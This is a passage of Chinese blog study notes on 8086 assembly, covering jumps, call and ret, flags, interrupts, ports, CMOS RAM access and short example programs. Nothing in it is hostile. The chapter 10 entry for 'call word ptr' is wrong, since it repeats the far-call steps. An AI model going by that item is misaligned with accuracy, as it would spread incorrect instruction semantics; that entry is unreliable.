数据处理的两个基本问题</h2><hr /><h3 id="基础概念-7">基础概念</h3><ol type="1"><li>我们将使用reg来表示一个寄存器，用sreg表示一个段寄存器。reg的集合包括：ax、bx、cx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di；sreg的集合包括：ds、ss、cs、es。</li><li>在8086CPU 中，只有这4个寄存器（bx、bp、si、di）可以用在“[…]”中来进行内存单元的寻址。</li><li>在“[…]”中，这4个寄存器（bx、bp、si、di）可以单个出现，或只能以四种组合出现：bx和si、bx和di、bp和si、bp和di</li><li><strong>只要在[…]中使用寄存器bp，而指令中没有显性的给出段地址，段地址就默认在ss中</strong>。</li><li>mov ax,1 对应机器码：B80100；mov ax,076a的机器码？B86A07</li><li>在没有寄存器名存在的情况下，用操作符<strong>Xptr</strong>指明内存单元的长度，X在汇编指令中可以为word或byte。</li><li>push指令只进行字操作</li><li>div是除法指令，使用div作除法的时候：<ul><li>除数：8位或16位，在寄存器或内存单元中</li><li>被除数：（默认）放在AX 或 DX（高16位）和AX（低16位）中</li><li>结果：如果除数为8位，商：AL，余数：AH；<strong>如果除数为16位，商：AX，余数：DX</strong>；</li></ul></li><li>div指令格式： div reg div 内存单元</li><li>div byte ptr ds:[0]<ul><li>含义为：(al)=(ax)/((ds) * 16+0)的商；</li><li>(ah)=(ax)/((ds) * 16+0)的余数</li></ul></li><li>div word ptr [bx+si+8]<ul><li>含义为：(ax)=[(dx) * 10000H+(ax)]/((ds) * 16+(bx)+(si)+8)的商；</li><li>(dx)=[(dx) * 10000H+(ax)]/((ds) * 16+(bx)+(si)+8)的余数</li></ul></li><li>dd 1，数据为00000001H，占2个字；</li><li><strong>dup</strong>是一个操作符，在汇编语言中同db、dw、dd等一样，也是由编译器识别处理的符号。 它是和db、dw、dd等数据定义伪指令配合使用的，用来进行数据的重复。<ul><li>db 3 dup (0) 定义了3个字节，它们的值都是0，相当于 db 0,0,0</li><li>db 3 dup(0,1,2)定义了9个字节，它们是0、1、2、0、1、2、0、1、2，相当于 db0,1,2,0,1,2,0,1,2</li><li>db 3 dup(‘abc’,’ABC’)定义了18个字节，它们是‘abcABCabcABCabcABC’，相当于db‘abcABCabcABCabcABC’</li></ul></li></ol><h2 id="第9章-转移指令的原理">第9章 转移指令的原理</h2><hr /><h3 id="基础概念-8">基础概念</h3><ol type="1"><li>jmp指令要给出两种信息： 转移的目的地址， 转移的距离（段间转移jmpfar、段内短转移jmp short，段内近转移jmp near）</li><li><strong>jmp short 标号</strong>（转到标号处执行指令）这种格式的 jmp指令实现的是<strong>段内短转移，它对IP的修改范围为-128~127</strong>，也就是说，它向前转移时可以最多越过128个字节，向后转移可以最多越过127个字节。</li><li>在“jmp short标号”指令所对应的机器码中，并不包含转移的目的地址，而<strong>包含的是转移的位移</strong>。这个位移，是编译器根据汇编指令中的“标号”计算出来的。</li><li>实际上，指令“jmp short 标号”的功能为(IP)=(IP)+8位位移。<ul><li><strong>8位位移=“标号”处的地址-jmp指令后的第一个字节的地址</strong>；</li><li>short指明此处的位移为8位位移；</li><li>8位位移的范围为-128~127，用补码表示。</li><li>8位位移由编译程序在编译时算出。</li></ul></li><li><strong>jmp near ptr</strong>标号它实现的时<strong>段内近转移</strong>。<strong>IP修改范围为：-32768~32767</strong>。</li><li>指令 <strong>jmp far ptr</strong> 标号实现的是<strong>段间转移，又称为远转移</strong>。farptr指明了指令用标号的段地址和偏移地址修改CS和IP。IP修改范围：随意。</li><li>jmp far ptr s所对应的机器码：EA 0B 01 BD 0B，其中包含转移的目的地址</li><li>转移地址在内存中的jmp指令有两种格式：<ul><li>jmp word ptr 内存单元地址（段内转移）<ul><li>功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址。</li></ul></li><li>jmp dword ptr 内存单元地址（段间转移）<ul><li>功能：从内存单元地址处开始存放着两个字，<strong>高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址</strong>。</li><li>(CS)=(内存单元地址+2)</li><li>(IP)=(内存单元地址)</li><li>内存单元地址可用寻址方式的任一格式给出。</li></ul></li></ul></li><li>jcxz指令（jump if cx equalszero）为有条件转移指令，<strong>所有的有条件转移指令都是短转移</strong>，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127。<strong>指令格式：jcxz标号 （如果(cx)=0，则转移到标号处执行。）</strong></li><li>jcxz 标号 指令操作：<ul><li>当(cx)=0时，(IP)=(IP)+8位位移）<ul><li><strong>8位位移=“标号”处的地址-jcxz指令后的第一个字节的地址；</strong></li><li>8位位移的范围为-128~127，用补码表示；</li><li>8位位移由编译程序在编译时算出。</li></ul></li><li>当(cx)不为0时，什么也不做（程序向下执行）。</li></ul></li><li>loop指令为循环指令，<strong>所有的循环指令都是短转移</strong>，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127。指令格式：loop标号</li></ol><h2 id="第10章-call和ret指令">第10章 CALL和RET指令</h2><hr /><h3 id="基础概念-9">基础概念</h3><ol type="1"><li>ret指令用栈中的数据，修改IP的内容，从而实现近转移；<ul><li>CPU执行ret指令时，相当于进行：pop IP</li></ul></li><li>retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移；<ul><li>CPU执行retf指令时，相当于进行：<ul><li>pop IP（<strong>注意！这是违法的，只是效果</strong>）</li><li>pop CS</li></ul></li></ul></li><li>CPU执行call指令，进行两步操作：<ul><li>将当前的 IP 或 CS 和 IP 压入栈中；</li><li>转移。</li></ul></li><li>CPU 执行指令“call 标号”时，相当于进行：<ul><li>push IP</li><li>jmp near ptr 标号</li></ul></li><li>call s在指令缓冲器时，IP已经改变了，指向了下一条指令，suoooooo以，<strong>call指令指向时将下一条指令的IP入栈</strong>。</li><li>CPU 执行指令 “call far ptr 标号”时，相当于进行：<ul><li>push CS</li><li>push IP</li><li>jmp far ptr 标号</li></ul></li><li>CPU执行call 16位reg时，相当于进行：<ul><li>push IP</li><li>jmp 16位寄存器</li></ul></li><li>call word ptr 内存单元地址， 汇编语法解释：<ul><li>push CS</li><li>push IP</li><li>jmp dword ptr 内存单元地址</li></ul></li><li>call dword ptr 内存单元地址， 汇编语法解释：<ul><li>push CS</li><li>push IP</li><li>jmp dword ptr 内存单元地址</li></ul></li></ol><h2 id="第11章-标志寄存器">第11章 标志寄存器</h2><hr /><h3 id="基础概念-10">基础概念</h3><ol type="1"><li>flag的第6位是<strong>ZF（zeroflag），零标志位</strong>。它记录相关指令执行后，其结果是否为0<ul><li>结果为0 ，ZF = 1</li><li>结果不为0，ZF = 0</li></ul></li><li>在8086CPU的指令集中，有的指令的执行是影响标志寄存器的，比如：<strong>add、sub、mul、div、inc、or、and</strong>等，它们大都是运算指令（进行逻辑或算术运算）；有的指令的执行对标志寄存器没有影响，比如：mov、push、pop等，它们大都是传送指令。</li><li>flag的第2位是<strong>PF，奇偶标志位</strong>。它记录指令执行后，结果的所有<strong>二进制位（低8位）中</strong>1的个数：<ul><li>为偶数，PF = 1；</li><li>为奇数，PF = 0。</li></ul></li><li>flag的第7位是<strong>SF，符号标志位</strong>。它记录指令执行后，其结果是否为负<ul><li>结果为负，SF = 1；</li><li>结果为正，SF = 0。</li><li>与有符号数的符号位规定一致</li><li>SF 标志，就是CPU对有符号数运算结果的一种记录，它记录数据的正负。</li><li>在我们将数据当作有符号数来运算的时候，可以通过它来得知结果的正负。</li><li>如果我们将数据当作无符号数来运算，SF的值则没有意义，虽然相关的指令影响了它的值。</li></ul></li><li>比如指令subal,al执行后，ZF、PF、SF等标志位都要受到影响，它们分别为：1、1、0。</li><li>flag的第0位是<strong>CF，进位标志位。</strong><ul><li>一般情况下，在进行无符号数运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。</li><li>比如：<ul><li>mov al,98H</li><li>add al,al ;</li><li>执行后： (al)=30H，CF=1，CF记录了最高有效位向更高位的进位值</li></ul></li></ul></li><li>flag的第11位是<strong>OF，溢出标志位。</strong><ul><li>一般情况下，OF记录了有符号数运算的结果是否发生了溢出。</li><li>如果发生溢出，OF=1，</li><li>如果没有，OF=0。</li><li><strong>CF是对无符号数运算有意义的标志位；而OF是对有符号数运算有意义的标志位。</strong></li></ul></li><li>对于无符号数运算，CPU用CF位来记录是否产生了进位；对于有符号数运算，CPU用 OF 位来记录是否产生了溢出。当然，还要用SF位来记录结果的符号。<ul><li>对于无符号数运算，98+99没有进位，CF=0；</li><li>对于有符号数运算，98+99发生溢出，OF=1。</li></ul></li><li><strong>adc是带进位加法指令 ，它利用了CF位上记录的进位值。</strong><ul><li>格式： adc 操作对象1,操作对象2</li><li>功能：操作对象1=操作对象1+操作对象2+CF</li><li>比如：adc ax,bx 实现的功能是：(ax)=(ax)+(bx)+CF</li></ul></li><li>下面的指令和add ax , bx具有相同的结果：add al,bl ，adcah,bh，看来CPU提供 adc指令的目的，就是来进行加法的第二步运算的。adc指令和add指令相配合就可以对更大的数据进行加法运算。</li><li><strong>sbb是带借位减法指令，它利用了CF位上记录的借位值。</strong><ul><li>格式：sbb 操作对象1,操作对象2</li><li>功能：操作对象1=操作对象1–操作对象2–CF</li><li>比如：sbb ax,bx,实现功能： (ax) = (ax) – (bx) – CF</li></ul></li><li><strong>cmp指令</strong><ul><li>格式：cmp 操作对象1,操作对象2</li><li>功能：计算操作对象1–操作对象2但并不保存结果，仅仅根据计算结果对标志寄存器进行设置。</li></ul></li><li>比如：cmpax,ax做(ax)–(ax)的运算，结果为0，但并不在ax中保存，仅影响flag的相关各位。指令执行后：<ul><li>ZF=1，</li><li>PF=1，0是偶数</li><li>SF=0，</li><li>CF=0，</li><li>OF=0。</li><li>根据cmp指令执行后ZF的值，就可以知道两个数据是否相等。</li></ul></li><li>如果没有溢出发生的话，那么，实际结果的正负和逻辑上真正结果的正负就一致了。所以，我们应该在考察SF（得知实际结果的正负）的同时考察OF（得知有没有溢出），就可以得知逻辑上真正结果的正负，同时就可以知道比较的结果。</li><li>虽然 je的逻辑含义是“相等则转移”，但它进行的操作是，ZF=1时则转移。“相等则转移”这种逻辑含义，是通过和cmp 指令配合使用来体现的，因为是cmp指令为“ZF=1”赋予了“两数相等”的含义。虽然我们分别讨论了cmp指令和与其比较结果相关的有条件转移指令，但是它们经常在一起配合使用。所以我们在联合应用它们的时候，不必再考虑cmp指令对相关标志位的影响和je等指令对相关标志位的检测。我们可以直接考虑cmp和je等指令配合使用时，表现出来的逻辑含义。它们在联合使用的时候表现出来的功能有些像高级语言中的IF语句。<strong>意思就是说je可以直接用，je就是等于则转移</strong></li><li><strong>jb 含义是低于则转移，ja 含义是高于则转移。</strong></li><li><strong>jna 含义是不高于则转移，即小于等于则转移；jnb含义是不低于则转移，即大于等于则转移。</strong></li></ol><p><a href="https://freeimage.host/i/HPSgh7e"><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405091507799.png"alt="HPSgh7e.md.png" /></a></p><ol type="1"><li>flag的第10位是<strong>DF，方向标志位。</strong><ul><li>在串处理指令中，控制每次操作后si，di的增减。</li><li>DF = 0：每次操作后si，di递增；</li><li>DF = 1：每次操作后si，di递减。</li></ul></li><li>串传送指令：<code>movsb</code>我们可以用汇编语法描述movsb的功能如下：<ul><li>mov es:[di],byte ptr ds:[si];8086并不支持这样的指令，这里只是个描述。</li><li>如果DF=0：inc si，inc di</li><li>如果DF=1：dec si，dec di</li><li><strong>就是ds:si 传到 es:di</strong></li></ul></li><li>rep movsb 用汇编语法来描述rep movsb的功能就是：<code>s : movsb</code> <code>loop s</code></li><li><strong>cld指令：将标志寄存器的DF位置0，std指令：将标志寄存器的DF位置1</strong></li><li>pushf ：将标志寄存器的值压栈；</li><li>popf ：从栈中弹出数据，送入标志寄存器中。</li><li>pushf和popf，为直接访问标志寄存 器提供了一种方法。</li></ol><h3 id="程序-1">程序</h3><ol type="1"><li>编程计算1EF000H+201000H，结果放在ax（高16位）和bx（低16位）中。</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">程序：<br> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">001EH</span> <br> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0F000H</span> <br> <span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">1000H</span> <br> <span class="hljs-keyword">adc</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0020H</span> <br> <span class="hljs-keyword">adc</span> 指令执行后，也可能产生进位值，所以也会对CF位进行设置<br><br>X86ASM<br></code></pre></td></tr></table></figure><ol type="1"><li>计算003E1000H–00202000H，结果放在ax，bx中。</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">程序如下：<br> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">1000H</span><br> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">003EH</span><br> <span class="hljs-keyword">sub</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">2000H</span><br> <span class="hljs-keyword">sbb</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0020H</span><br><br>X86ASM<br></code></pre></td></tr></table></figure><h2 id="第12章-内中断">第12章 内中断</h2><hr /><h3 id="基础概念-11">基础概念</h3><ol type="1"><li>我们更简洁的描述中断过程，如下：<ul><li>（1）取得中断类型码N；</li><li>（2） pushf</li><li>（3） TF = 0，IF = 0</li><li>（4） push CS</li><li>（5） push IP</li><li>（6）(IP) = (N * 4)，(CS) = (N * 4+2)</li><li>在最后一步完成后，CPU 开始执行由程序员编写的中断处理程序。</li></ul></li><li>iret指令的功能用汇编语法描述为：<ol type="1"><li>pop IP</li><li>pop CS</li><li>popf</li></ol></li><li>CPU当然不能让这种情况发生，解决的办法就是，<strong>在进入中断处理程序之前，设置TF=0</strong>。从而<strong>避免CPU在执行中断处理程序的时候发生单步中断</strong>。这就是为什么在中断过程中有 TF=0这个步骤。</li></ol><h2 id="第13章-int指令">第13章 int指令</h2><hr /><h3 id="程序-2">程序</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-comment">;编程：在屏幕的5行12列显示字符串“welcome to masm!”。</span><br><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br>data <span class="hljs-meta">segment</span> <br><span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;Welcome to masm!&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span><br>data ends<br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span> <span class="hljs-keyword">mov</span> <span class="hljs-number">ah</span>,<span class="hljs-number">2</span> <span class="hljs-comment">;置光标</span><br><span class="hljs-keyword">mov</span> <span class="hljs-number">bh</span>,<span class="hljs-number">0</span> <span class="hljs-comment">;第0页</span><br><span class="hljs-keyword">mov</span> <span class="hljs-number">dh</span>,<span class="hljs-number">5</span> <span class="hljs-comment">;dh中放行号</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>,<span class="hljs-number">12</span> <span class="hljs-comment">;dl中放列号</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">10h</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,data<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dx</span>,<span class="hljs-number">0</span> <span class="hljs-comment">;ds:dx指向字符串的首地址data:0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-number">ah</span>,<span class="hljs-number">9</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span> <br>code ends<br>end start<br><br>X86ASM<br></code></pre></td></tr></table></figure><h2 id="第14章-端口">第14章 端口</h2><hr /><h3 id="基本概念">基本概念</h3><ol type="1"><li><strong>in al,60h;从60h号端口读入一个字节</strong><ul><li>执行时与总线相关的操作：</li><li>① CPU通过地址线将地址信息60h发出；</li><li>②CPU通过控制线发出端口读命令，选中端口所在的芯片，并通知它，将要从中读取数据；</li><li>③ 端口所在的芯片将60h端口中的数据通过数据线送入CPU。</li></ul></li><li>注意：在in和out 指令中，只能使用 ax 或al来存放从端口中读入的数据或要发送到端口中的数据。访问8 位端口时用al，访问16 位端口时用ax 。</li><li>对0～255以内的端口进行读写：<ul><li><strong>in al,20h ;从20h端口读入一个字节</strong></li><li><strong>out 20h,al ;往20h端口写入一个字节</strong></li></ul></li><li>对256～65535的端口进行读写时，端口号放在dx中：<ul><li>mov dx,3f8h ;将端口号3f8送入dx</li><li>in al,dx ;从3f8h端口读入一个字节</li><li>out dx,al ;向3f8h端口写入一个字节</li></ul></li><li><strong>70h为地址端口</strong>，存放要访问的CMOSRAM单元的地址；<strong>71h为数据端口</strong>，存放从选定的CMOS RAM单元中读取的数据，或要写入到其中的数据。</li><li>shl逻辑左移指令，功能为：<ul><li>将一个寄存器或内存单元中的数据向左移位；</li><li>将最后移出的一位写入CF中；</li><li>最低位用0补充。</li></ul></li><li>如果移动位数大于1时，必须将移动位数放在<strong>cl</strong>中。</li><li>shr逻辑右移指令</li></ol><h3 id="程序-3">程序</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-comment">;编程，读CMOS RAM的2号单元的内容</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">2</span><br><span class="hljs-keyword">out</span> <span class="hljs-number">70h</span>,<span class="hljs-built_in">al</span>        <span class="hljs-comment">;将 2 送入端口 70h</span><br><span class="hljs-keyword">in</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">71h</span>          <span class="hljs-comment">;从 71h 读出 2 号单元的内容</span><br><br><span class="hljs-comment">;编程，向CMOS RAM的2号单元写入0</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">2</span><br><span class="hljs-keyword">out</span> <span class="hljs-number">70h</span>,<span class="hljs-built_in">al</span>        <span class="hljs-comment">;将 2 送入端口 70h</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">out</span> <span class="hljs-number">71h</span>,<span class="hljs-built_in">al</span>       <span class="hljs-comment">;向 2 号单元写入 0</span><br> <br><br><br>X86ASM<br></code></pre></td></tr></table></figure><h2 id="第15章-外中断">第15章 外中断</h2><hr /><h3 id="基本概念-1">基本概念</h3><ol type="1"><li>外设的输入不直接送入内存和CPU ，而是送入相关的接口芯片的端口中；CPU向外设的输出也不是直接送入外设，而是先送入端口中，再由相关的芯片送到外设。</li><li>可屏蔽中断是CPU 可以不响应的外中断。CPU是否响应可屏蔽中断，要看标志寄存器的IF 位的设置。<ul><li>当CPU 检测到可屏蔽中断信息时：</li><li>如果IF=1，则CPU 在执行完当前指令后响应中断，引发中断过程；</li><li>如果IF=0，则不响应可屏蔽中断。</li></ul></li><li>内中断所引发的中断过程：<ul><li>（1）取中断类型码n；</li><li>（2）标志寄存器入栈，IF=0，TF=0；</li><li>（3）CS 、IP 入栈；</li><li>（4）(IP)=(n* 4)，(CS)=(n* 4+2)，</li><li>由此转去执行中断处理程序。</li></ul></li><li>将IF置0的原因就是，<strong>在进入中断处理程序后，禁止其他的可屏蔽中断。</strong></li><li> 不可屏蔽中断是CPU <strong>必须响应</strong>的外中断。当CPU检测到不可屏蔽中断信息时，则在执行完当前指令后，立即响应，引发中断过程。对于8086CPU不可屏蔽中断的中断类型码固定为2。所以中断过程中，不需要取中断类型码。</li><li>不可屏蔽中断的中断过程：<ul><li>1、标志寄存器入栈，IF=0，TF=0；</li><li>2、CS、IP入栈；</li><li>3、(IP)=(8)，(CS)=(0AH)。</li></ul></li><li>一般将按下一个键时产生的扫描码称为通码，松开一个键产生的扫描码称为断码。</li><li> 扫描码长度为一个字节，通码的第7 位为 0，断码的第7位为1，即：断码=通码＋80H</li></ol><h2 id="第16章-直接定址表">第16章 直接定址表</h2><hr /><h3 id="基本概念-2">基本概念</h3><ol type="1"><li>对于程序中的a db 1,2,3,4,5,6,7,8 ：<ul><li>指令：mov al,a [si]，，相当于：mov al,cs:0[si]，</li><li>指令：mov al,a[3]，，相当于：mov al,cs:0[3]</li><li>指令：mov al,a[bx+si+3] ，，相当于：mov al,cs:0[bx+si+3]</li></ul></li><li>以后，我们将这种标号称为数据标号。它标记了存储数据的单元的地址和长度。它不同于仅仅表示地址的地址标号。</li></ol><hr /><blockquote><p>牢🐏，当你看到这的时候，你就稳了，加油🧐🧐🧐</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
